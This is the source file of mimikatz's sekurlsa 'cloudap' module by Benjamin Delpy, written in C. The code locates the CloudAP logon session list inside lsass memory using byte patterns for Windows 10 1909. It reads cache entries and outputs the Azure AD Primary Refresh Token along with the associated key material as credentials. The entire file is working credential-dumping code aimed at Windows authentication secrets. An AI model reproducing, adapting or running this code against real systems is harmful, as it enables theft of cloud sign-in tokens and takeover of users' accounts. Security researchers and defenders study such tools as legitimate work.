/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_cloudap.h"

#if defined(_M_X64)
BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42, 0x18, 0x75};
KULL_M_PATCH_GENERIC CloudApReferences[] = {
	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-9}},
};
#elif defined(_M_IX86)
BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x8b, 0x31, 0x39, 0x72, 0x10, 0x75};
KULL_M_PATCH_GENERIC CloudApReferences[] = {
	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-8}},
};
#endif

PKIWI_CLOUDAP_LOGON_LIST_ENTRY CloudApGlobalLogonSessionList = NULL;

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package = {L"cloudap", kuhl_m_sekurlsa_enum_logon_callback_cloudap, FALSE, L"cloudap.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_single_package[] = {&kuhl_m_sekurlsa_cloudap_package};

NTSTATUS kuhl_m_sekurlsa_cloudap(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_cloudap_single_package, 1);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_cloudap(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	KIWI_CLOUDAP_LOGON_LIST_ENTRY logon;
	KIWI_CLOUDAP_CACHE_LIST_ENTRY cache;
	KIWI_CLOUDAP_CACHE_UNK unk;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	KIWI_GENERIC_PRIMARY_CREDENTIAL creds = {0};

	if(kuhl_m_sekurlsa_cloudap_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_cloudap_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL)/*(CloudApGlobalLogonSessionList = (PKIWI_CLOUDAP_LOGON_LIST_ENTRY) ((PBYTE) kuhl_m_sekurlsa_cloudap_package.Module.Informations.DllBase.address + 0x71100))*/)
	{
		aLsassMemory.address = CloudApGlobalLogonSessionList;
		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_CLOUDAP_LOGON_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
		{
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY)))
			{
				if(logon.cacheEntry)
				{
					aLocalMemory.address = &cache;
					aLsassMemory.address = logon.cacheEntry;
					if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)))
					{
						kprintf(L"\n\t     Cachedir : %s", cache.toname);
						if(cache.cbPRT && cache.PRT)
						{
							creds.UserName.Length = creds.UserName.MaximumLength = (USHORT) cache.cbPRT;
							creds.UserName.Buffer = (PWSTR) cache.PRT;
						}

						if(cache.toDetermine)
						{
							aLocalMemory.address = &unk;
							aLsassMemory.address = cache.toDetermine;
							if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_CLOUDAP_CACHE_UNK)))
							{
								kprintf(L"\n\t     Key GUID : ");
								kull_m_string_displayGUID(&unk.guid);
								creds.Password.Length = creds.Password.MaximumLength = (USHORT) unk.unkSize;
								creds.Password.Buffer = (PWSTR) unk.unk;
							}
						}
						kuhl_m_sekurlsa_genericCredsOutput(&creds, pData, KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT);
					}
				}
			}
		}
	} else kprintf(L"KO");
}